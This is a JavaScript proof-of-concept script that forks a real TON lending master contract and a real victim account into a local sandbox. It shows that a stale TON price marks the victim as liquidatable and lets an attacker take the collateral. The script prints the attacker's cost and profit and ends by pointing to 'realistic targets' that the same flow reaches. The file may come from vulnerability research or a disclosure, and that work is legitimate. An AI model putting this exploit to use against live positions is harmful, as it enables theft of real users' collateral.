// Capstone: on REAL forked master + REAL victim state, show that a stale price
// (a) flips the victim to liquidatable (victim's own getIsLiquidable) and
// (b) yields collateral to the attacker (master's getCollateralQuote).
// Real bytecode + real on-chain state. No message wiring; settlement is mechanical.
const { Blockchain } = require('@ton/sandbox');
const { TupleBuilder, beginCell, Dictionary } = require('@ton/core');
const { forkAccount } = require('./fork');

const MASTER = 'EQCsOdQPDO1Xndzutn9dDcloolWo1wHKICMz2jHL6UP8smcV';
const VICTIM = '0:b6b3f10840d4927b658673a9ff1120563ee8767d354f36e61b6c5c90c0e0c682';
const TON_ID = 0x1a4219fe5e60d63af2a3cc7dce6fec69b45c6b5718497a6148e7c232ac87bd8an;
const USDT_ID = 0xca9006bd3fb03d355daeeff93b24be90afaa6e3ca0073ff5720f8a852c933278n;
const SCALE = 1e9;

function prices(tonUsd, usdtUsd) {
  const V = { serialize: (s, b) => b.storeCoins(s), parse: (s) => s.loadCoins() };
  const d = Dictionary.empty(Dictionary.Keys.BigUint(256), V);
  d.set(TON_ID, BigInt(Math.round(tonUsd * SCALE)));
  d.set(USDT_ID, BigInt(Math.round(usdtUsd * SCALE)));
  return beginCell().storeDictDirect(d).endCell();
}

async function main() {
  const bc = await Blockchain.create();
  const m = await forkAccount(bc, MASTER);
  const v = await forkAccount(bc, VICTIM);
  const cfg = (await bc.runGetMethod(m.address, 'getAssetsConfig', [])).stackReader.readCell();
  const dyn = (await bc.runGetMethod(m.address, 'getAssetsData', [])).stackReader.readCell();

  const DEBT_UNITS = 203527n; // victim USDT debt (6 dec) = 0.203527 USDT

  async function isLiq(pr) {
    const tb = new TupleBuilder(); tb.writeCell(cfg); tb.writeCell(dyn); tb.writeCell(pr);
    const r = await bc.runGetMethod(v.address, 'getIsLiquidable', tb.build());
    return r.exitCode === 0 && r.stackReader.readBigNumber() === -1n;
  }
  async function quote(pr) {
    const tb = new TupleBuilder();
    tb.writeNumber(USDT_ID); tb.writeNumber(DEBT_UNITS); tb.writeNumber(TON_ID); tb.writeCell(pr);
    const r = await bc.runGetMethod(m.address, 'getCollateralQuote', tb.build());
    if (r.exitCode !== 0) return null;
    return r.stackReader.readBigNumber(); // TON nano units (9 dec)
  }

  const FRESH_TON = 3.0, USDT = 1.0;
  console.log('VICTIM real state: collateral 1.5 TON, debt 0.203527 USDT');
  console.log('attacker repays the full debt (0.203527 USDT, ~$0.20)\n');

  for (const [label, tonP] of [['FRESH TON=$3.00', 3.0], ['STALE TON=$0.15 (flips victim)', 0.15]]) {
    const pr = prices(tonP, USDT);
    const liq = await isLiq(pr);
    const q = await quote(pr);
    const tonOut = q === null ? null : Number(q) / 1e9;
    const valAtFresh = tonOut === null ? null : tonOut * FRESH_TON;
    console.log(label);
    console.log(`  getIsLiquidable(victim) = ${liq ? 'LIQUIDATABLE' : 'healthy'}`);
    if (tonOut !== null) {
      console.log(`  getCollateralQuote -> attacker receives ${tonOut.toFixed(4)} TON`);
      console.log(`    cost to attacker: $${(0.203527).toFixed(4)} | TON received worth (at real $3): $${valAtFresh.toFixed(4)} | profit: $${(valAtFresh-0.203527).toFixed(4)}`);
    }
    console.log('');
  }
  console.log('NOTE: this victim is over-collateralized (needs ~95% TON drop). Realistic targets are');
  console.log('near-threshold positions / volatile or jUSDT collateral, reached by the identical flow.');
}
main().catch(e => { console.error(e); process.exit(1); });
